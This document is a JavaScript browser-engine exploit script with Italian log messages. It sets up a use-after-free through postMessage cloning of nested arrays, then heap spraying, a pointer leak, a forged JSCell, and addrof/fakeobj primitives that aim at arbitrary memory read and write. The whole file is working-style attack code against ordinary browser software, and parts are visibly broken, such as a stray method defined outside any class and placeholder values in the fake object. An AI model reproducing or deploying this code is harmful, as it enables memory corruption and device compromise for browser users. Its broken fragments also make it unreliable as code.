import { Int } from "./module/int64.mjs";
import { Memory } from "./module/mem.mjs";
import { KB, MB } from "./module/offset.mjs";
import { BufferView } from "./module/rw.mjs";
import { die, DieError, log, clear_log, sleep, hex, align } from "./module/utils.mjs";
import * as off from "./module/offset.mjs";
import * as config from "./config.mjs";

 


const maxOffset = Math.max(
  off.strimpl_inline_str  + 8,   
  off.js_inline_prop      + 8,  
  off.js_butterfly        + 8,   
  off.js_butterfly - 0x10 + 8    
);

//const UAF_SIZE = off.size_strimpl + off.js_inline_prop;
//const SPRAY_COUNT = 0x400;
//const UAF_SIZE = maxOffset + 0x30;
const UAF_SIZE = 0x40; 
const SPRAY_COUNT = 0x800;

function gc() {
   // new Uint8Array(4 * MB);
 //  for (let i = 0; i < 5; i++) new Uint8Array(8 * MB);
for (let i = 0; i < 3; i++) new Uint8Array(8 * MB);

}
function getBigUint64Compat(dv, offset, littleEndian = true) {
  const low = dv.getUint32(offset, littleEndian);
  const high = dv.getUint32(offset + 4, littleEndian);
  return (BigInt(high) << 32n) | BigInt(low);
}
 writeU64(offset, value, littleEndian = true) {
 
  const low = Number(value & 0xFFFFFFFFn);        
  const high = Number((value >> 32n) & 0xFFFFFFFFn); 

  if (littleEndian) {
    this.dv.setUint32(offset, low, true);     
    this.dv.setUint32(offset + 4, high, true);
  } else {
    this.dv.setUint32(offset, high, false);    
    this.dv.setUint32(offset + 4, low, false); 
  }
}

function readU64(dv, offset, littleEndian = true) {
  const low = dv.getUint32(offset, littleEndian);
  const high = dv.getUint32(offset + 4, littleEndian);
  return (BigInt(high) << 32n) | BigInt(low);
}

function setBigUint64Compat(dv, offset, value, littleEndian = true) {
  const low = Number(value & 0xFFFFFFFFn);
  const high = Number(value >> 32n);
  dv.setUint32(offset, littleEndian ? low : high, littleEndian);
  dv.setUint32(offset + 4, littleEndian ? high : low, littleEndian);
}
function findAllCorrupted(buffers) {
 const bad = [];
  for (let i = 0; i < buffers.length; i++) {
    for (let off = 0; off < buffers[i].length; off += 4) {
      if (buffers[i][off] !== 0x41) {
       // log(`Buffer ${i} corrupt at offset 0x${off.toString(16)} = 0x${buffers[i][off].toString(16)}`);
        bad.push(i);
        break;
      }
    }
  }
  return bad;
}

function spray(count, size) {
  const arr = [];
  for (let i = 0; i < count; i++) {
    const v = new Uint8Array(size);
    v[0] = 0x41;
    arr.push(v);
 

  }
  return arr;
}
function triggerUAF(depth) {
 
  let root = [];
 
  let cur = root;

  for (let i = 0; i < depth; i++) {
 
    const buffer = new Uint8Array(0x20);
    buffer[0] = 0x99;   
    const arrayFiglio = [];

 
    cur.push([ buffer, arrayFiglio ]);

  
    cur = arrayFiglio;
  }

  return root;
}


/*function triggerUAF(depth) {
  let root = new Map();
  let cur = root;
  const markerArr = [];
  for (let i=0;i<100;i++) markerArr.push(new Date(0xffff));
  for (let i=0;i<depth;i++) {
    const m = new Map();
    cur.set(new Date(i), [m, markerArr]);
    cur = m;
  }
  return root;
}
*/
/*async function doUAF(depth) {
  const obj = triggerUAF(depth);
  let recv;
  const p = new Promise(r => addEventListener('message', e=>{recv=e.data; r();},{once:true}));
  postMessage(obj, location.origin);
  await p;
  return recv;
}*/

 
 
async function doUAF(depth) {
  let recv;
  let obj = triggerUAF(depth);
  log("[doUAF] prima postMessage");
  const p = new Promise(r => addEventListener(
    'message',
    e => { recv = e.data; r(); },
    { once: true }
  ));
  postMessage(obj, location.origin);
  obj = null;
  log("[doUAF] dopo postMessage, prima GC");
  for (let i = 0; i < 5; i++) new Uint8Array(8 * MB);
 log("[doUAF] dopo GC, aspetto clone");
  await p;
  log("[doUAF] clone ricevuto");
  return recv;
}

 


function findCorrupted(buffers) {
  for (let i=0;i<buffers.length;i++) {
    if (buffers[i][0] !== 0x41) return {buf:buffers[i], idx:i};
  }
  die("No corrupted buffer");
}

async function main() {
addEventListener('error', event => {
    const reason = event.error;
    alert(
        'Unhandled error\n'
        + `${reason}\n`
        + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
        + `${reason.stack}`
    );
    return true;
});

addEventListener('unhandledrejection', event => {
    const reason = event.reason;
    alert(
        'Unhandled rejection\n'
        + `${reason}\n`
        + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
        + `${reason.stack}`
    );
});
 

 
//  const pre = spray(SPRAY_COUNT, UAF_SIZE);
 const pre = spray(SPRAY_COUNT * 2, UAF_SIZE);

  const leaked = await doUAF(3000);
 for (let round = 0; round < 3; round++) {
  log(`[+] GC round ${round}`);
  log(`[doUAF] prima del GC`);

  gc();
  await sleep(1);
   log(`[+] Spray round ${round}`);
  spray(SPRAY_COUNT, UAF_SIZE);
}
 const buffers = spray(SPRAY_COUNT * 4, UAF_SIZE);

//const buffers = spray(SPRAY_COUNT, UAF_SIZE);
 // gc(); await sleep();
//  const buffers = spray(SPRAY_COUNT, UAF_SIZE);
  const bad = findAllCorrupted(buffers);
  if (!bad.length) {
    die("No corrupted buffer");
  }
  log(`[+] Corrupted at indices: ${bad}`);
 
//  const {buf, idx} = findCorrupted(buffers);
   const idx = bad[0];
  const buf = buffers[idx];
  log(`[+] Reclaimed slot at index ${idx}`);
  

 
  const dv = new DataView(buf.buffer);
 for (let i = 0; i < UAF_SIZE; i += 8) {
 let q = getBigUint64Compat(dv, i, true);
  log(`[FAKE VERIFY] @0x${i.toString(16)} = 0x${q.toString(16)}`);
}
  function read64(view, offset) {
    const low = view.getUint32(offset, true);
    const high = view.getUint32(offset + 4, true);
    return BigInt(low) + (BigInt(high) << 32n);
  }
log("[FAKE DV DUMP]");
for (let i = 0; i < 0x40; i += 8) {
   log(`Offset 0x${i.toString(16)}: 0x${getBigUint64Compat(dv, i).toString(16)}`);
}
  const leakPtr = read64(dv, off.strimpl_inline_str);
  log(`[+] Leaked pointer: ${hex(leakPtr)}`);

  //const KNOWN = BigInt(off.heap_slide);
      
  const base = leakPtr - BigInt(0x0n);  
  log(`[+] Computed base: ${hex(base)}`);

  const fake = new Uint8Array(UAF_SIZE);
  const fv = new DataView(fake.buffer);
 /* fv.setUint32(0, Number((base + BigInt(off.js_cell_header)) & 0xffffffffn), true);
  fv.setUint32(4, Number(((base + BigInt(off.js_cell_header)) >> 32n) & 0xffffffffn), true);
  fv.setUint32(off.js_butterfly, Number((base + BigInt(off.butterfly_data)) & 0xffffffffn), true);
  fv.setUint32(off.js_butterfly+4, Number(((base + BigInt(off.butterfly_data)) >> 32n) & 0xffffffffn), true);
  fv.setUint32(off.js_butterfly - 0x10, 7, true);
  fv.setUint32(off.js_butterfly - 8, 1, true);
  fv.setUint32(off.js_butterfly - 4, 1, true);
*/

 // Header JSCell finto
fv.setUint32(0x00, 0x41414141, true); // low
fv.setUint32(0x04, 0x43434343, true); // high

// Inline strimpl (es: 0x10)
fv.setUint32(0x10, 0x44444444, true);
fv.setUint32(0x14, 0x45454545, true);

// Offset js_butterfly (es: 0x20)
fv.setUint32(0x20, 0xdeadbeef, true);
fv.setUint32(0x24, 0xcafebabe, true);

// Simula capacity
fv.setUint32(0x10, 0x7, true);   // max length
fv.setUint32(0x18, 0x1, true);   // start index
fv.setUint32(0x1c, 0x1, true);   // size

  new Uint8Array(buf).set(new Uint8Array(fake));
  log("[+] Fake JSCell written");
 
for (let i = 0; i < UAF_SIZE; i += 8) {
  let val = getBigUint64Compat(dv, i, true);

  log(`[FAKE @0x${i.toString(16)}] = 0x${val.toString(16)}`);
}


 

 
   const bv = new BufferView(buf.buffer);
  const fakeArr = bv.readU64(off.js_butterfly);

  function addrof(obj) {
    bv.writeU64(off.js_butterfly - 0x10, Memory.toValues(obj));
    return bv.readU64(off.js_butterfly - 0x10);
  }
  function fakeobj(addr) {
    bv.writeU64(off.js_butterfly, addr);
    return fakeArr;
  }
 
  const testAddr = addrof(buf);
  log('[+] addrof(buf)=', hex(testAddr));
  const view = fakeobj(testAddr + BigInt(0x100));
  log('[+] fakeobj success');

  clear_log();
  log('Arbitrary R/W ready!');
}

main().catch(e=>alert(e));
